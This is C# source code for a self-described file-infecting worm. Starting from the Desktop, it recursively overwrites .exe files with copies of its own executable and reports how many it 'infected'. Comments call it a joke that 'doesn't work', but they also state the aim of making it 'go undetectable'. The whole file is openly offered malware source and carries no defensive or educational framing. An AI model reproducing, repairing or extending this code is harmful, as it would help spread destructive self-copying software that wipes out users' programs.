//a simple worm that simply doesn't work, but it would've in the ol' days!, I think...
using System;
using System.IO;
using System.Reflection;

namespace simpleWorm
{
	//a simple worm that simply doesn't work, but it would've in the ol' days!, I think...
	// the idea for the spreading mechanism is copied from 'Giant black book of computer viruses' 
    class SimpleWorm
    {
        int depth;
        public SimpleWorm(int depth = 1)
        {
            this.depth = depth;
        }
        public bool infectFile(string path)
        {
            
            if (Path.GetExtension(path) == ".exe"){
                File.Copy(Assembly.GetExecutingAssembly().Location, path);
                return true;
            }
            else
                return false;
        }
        public int infectFilesInFolder(string path, bool alreadyCheckedDirectories = false)
        {
            int countInfected = 0;
            DirectoryInfo dir = new DirectoryInfo(path);
            if (dir.GetDirectories().Length > 0 && (depth--) > 0 && !alreadyCheckedDirectories)
                return infectFolder(path);
            foreach (var file in dir.GetFiles())
            {
                if (infectFile(file.FullName))
                    countInfected++;
            }
            return countInfected;
        }
        public int infectFolder(string path)
        {
            int countInfected = 0;
            DirectoryInfo dir = new DirectoryInfo(path);
            foreach (var directory in dir.GetDirectories())
            {
                countInfected += infectFilesInFolder(directory.FullName);
            }
            countInfected += infectFilesInFolder(path, true);
            return countInfected;
        }
        public void Conquer()
        {
            string startPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            // can take it more seriously and infect a series of folders
            int countInfected = infectFolder(startPath);
            Console.WriteLine("Infected a total of {0} files.", countInfected);
        }

    }
    class Program
    {
        static void Main(string[] args)
        {
            unchecked
            {
                SimpleWorm worm = new SimpleWorm((int)double.PositiveInfinity);
                worm.Conquer();
                // obviously this is just a joke
            }
            // now just need to make this beauty go undetectable and stuff
        }
    }
}